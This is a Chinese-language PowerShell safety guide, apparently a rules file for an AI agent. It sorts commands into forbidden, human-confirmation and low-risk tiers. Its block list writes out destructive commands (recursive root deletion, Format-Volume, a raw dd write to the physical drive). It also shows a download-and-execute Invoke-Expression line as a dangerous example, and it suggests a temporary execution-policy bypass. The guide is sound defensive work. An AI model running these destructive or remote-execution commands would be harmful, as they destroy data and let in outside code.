# PowerShell 安全使用指南

## 元信息

| 项目 | 内容 |
|------|------|
| **目标对象** | PowerShell |
| **动作类型** | security |
| **细分** | guidelines |
| **适用场景** | 使用 PowerShell 执行系统命令、文件操作、自动化脚本 |
| **风险等级** | 高（涉及系统级操作） |
| **最后更新** | 2026-02-15 |

---

## 执行步骤

### 步骤 1：命令执行前自检

**每次执行 PowerShell 命令前，必须检查以下内容：**

1. **路径检查**：确认当前工作目录 (`$PWD`)
2. **变量检查**：展开所有变量，确认值非空且符合预期
3. **命令解析**：识别命令类型（删除/修改/查询/创建）
4. **风险评级**：根据下方清单判定风险等级

### 步骤 2：风险等级判定

根据命令内容，判定为以下三类之一：

#### 🔴 绝对禁止（直接拒绝）

| 危险操作 | 示例命令 | 拒绝原因 |
|---------|---------|---------|
| 递归删除根目录 | `rm -rf /`, `Remove-Item -Recurse -Force C:\` | 毁灭性数据丢失 |
| 磁盘格式化 | `Format-Volume`, `diskpart` 格式化命令 | 不可逆数据销毁 |
| 块设备直接写入 | `dd if=... of=\\.\PhysicalDrive0` | 底层磁盘破坏 |
| Fork Bomb | 递归调用脚本自身无限循环 | 系统资源耗尽 |
| 注册表破坏性修改 | 删除关键注册表项 | 系统无法启动 |
| 系统服务禁用 | 禁用关键系统服务 | 系统功能丧失 |
| 防火墙完全关闭 | 无差别关闭所有防火墙规则 | 安全边界消失 |
| 用户权限提升绕过 | UAC 绕过技术 | 违反最小权限原则 |
| 恶意代码执行 | 下载并执行未知脚本 | 恶意软件感染 |

**处理方式**：
- 立即中止操作
- 向用户报告："检测到高危操作，已根据安全协议拒绝执行"
- 记录到安全日志

#### 🟡 人工确认（HITL - Human In The Loop）

| 高风险操作 | 示例命令 | 确认要点 |
|-----------|---------|---------|
| 管理员权限操作 | `Start-Process powershell -Verb runAs` | 确认必要性 |
| 系统配置修改 | 修改 `$env:PATH`, 系统变量 | 确认修改范围 |
| 注册表修改 | `Set-ItemProperty HKLM:\...` | 确认键值路径 |
| 服务管理 | `Start-Service`, `Stop-Service` | 确认服务名称 |
| 网络配置 | `Set-NetFirewallRule`, `netsh` | 确认规则影响 |
| 软件安装/卸载 | `msiexec`, `winget uninstall` | 确认软件名称 |
| 用户账户操作 | `New-LocalUser`, `Remove-LocalUser` | 确认账户信息 |
| 计划任务修改 | `schtasks`, `New-ScheduledTask` | 确认任务内容 |
| 大文件/目录删除 | 删除 >1GB 的目录 | 确认路径和内容 |
| 变量路径删除 | `Remove-Item $env:TEMP\*` | 先展开变量确认 |

**处理方式**：
- 暂停执行
- 向用户说明：操作类型、影响范围、潜在风险
- 请求明确确认："请确认是否执行 [具体操作]？"
- 等待用户回复 `yes`/`确认`/`执行` 后才继续

#### 🟢 快速通道（直接执行）

| 低风险操作 | 示例命令 |
|-----------|---------|
| 文件内容读取 | `Get-Content`, `Select-String` |
| 目录列表查看 | `Get-ChildItem`, `dir`, `ls` |
| 进程/服务查询 | `Get-Process`, `Get-Service` |
| 系统信息获取 | `Get-ComputerInfo`, `systeminfo` |
| 文本/配置文件修改 | 修改文档、配置文件（非系统） |
| 简单文件操作 | 复制、移动、重命名（确认路径后） |

**处理方式**：
- 直接执行
- 简要记录操作内容

---

## PowerShell 特别注意事项

### 1. 路径安全检查

```powershell
# ❌ 危险：变量可能为空或包含意外值
Remove-Item -Recurse $targetPath

# ✅ 安全：先展开变量并确认
Write-Host "将要删除: $targetPath"
# 等待用户确认后再执行
```

### 2. 编码问题

| 问题 | 说明 | 解决方案 |
|------|------|---------|
| BOM 头 | PowerShell 默认带 BOM | 使用 `-Encoding UTF8NoBOM` |
| 执行策略 | 默认 Restricted | 需要时临时设置 `-ExecutionPolicy Bypass` |
| 换行符 | CRLF vs LF | 跨平台时注意一致性 |

### 3. 变量展开风险

```powershell
# ❌ 危险：变量可能为空
Remove-Item "$env:TEMP\important_file.txt"

# ✅ 安全：先检查变量
if ($env:TEMP) {
    $fullPath = Join-Path $env:TEMP "important_file.txt"
    Write-Host "目标路径: $fullPath"
    # 确认后再操作
}
```

### 4. 管道和重定向

```powershell
# ⚠️ 注意：重定向会覆盖文件，无提示
command > file.txt

# ✅ 安全：先检查文件是否存在
if (Test-Path file.txt) {
    Write-Host "文件已存在，将被覆盖"
}
```

### 5. 远程执行

```powershell
# ❌ 危险：执行远程脚本
Invoke-Expression (Invoke-WebRequest "http://example.com/script.ps1").Content

# ✅ 安全：先下载，检查内容，再执行
Invoke-WebRequest "http://example.com/script.ps1" -OutFile local_script.ps1
# 人工检查脚本内容后再执行
```

---

## 工具选择

| 场景 | 推荐工具 | 备选工具 |
|------|---------|---------|
| 简单文件操作 | `run_command` | `file_write`/`file_read` |
| 复杂脚本执行 | PowerShell 脚本文件 | `run_command` |
| 系统信息查询 | PowerShell Cmdlet | `run_command` |
| 文件批量处理 | PowerShell 循环脚本 | 其他脚本语言 |

---

## 失败经验

| 时间 | 场景 | 错误 | 教训 |
|------|------|------|------|
| - | - | - | 待补充 |

---

## 成功案例

| 时间 | 场景 | 操作 | 结果 |
|------|------|------|------|
| 2026-02-15 | 文件重命名 | `ren "原文件" "新文件"` | ✅ 成功，内容完整保留 |

---

## 执行流程图

```
收到 PowerShell 命令
       ↓
  解析命令内容
       ↓
  检查危险模式？
       ↓
   ┌───┴───┐
   ↓       ↓
  是        否
   ↓       ↓
 拒绝执行  检查风险等级
   ↓       ↓
 报告用户  ┌────┬────┐
           ↓    ↓    ↓
         高危   中危  低危
           ↓    ↓    ↓
         HITL  HITL  直接执行
           ↓    ↓    ↓
         等待确认    执行
           ↓
        用户确认？
           ↓
        ┌──┴──┐
        ↓     ↓
       是     否
        ↓     ↓
      执行   取消
```

---

## 参考文档

- [PowerShell 执行策略](https://docs.microsoft.com/powershell/module/microsoft.powershell.security/set-executionpolicy)
- [PowerShell 安全最佳实践](https://docs.microsoft.com/powershell/scripting/security/security-guidelines)

---

*最后更新：2026-02-15*
*创建者：贝露丹蒂 (Belldandy)*
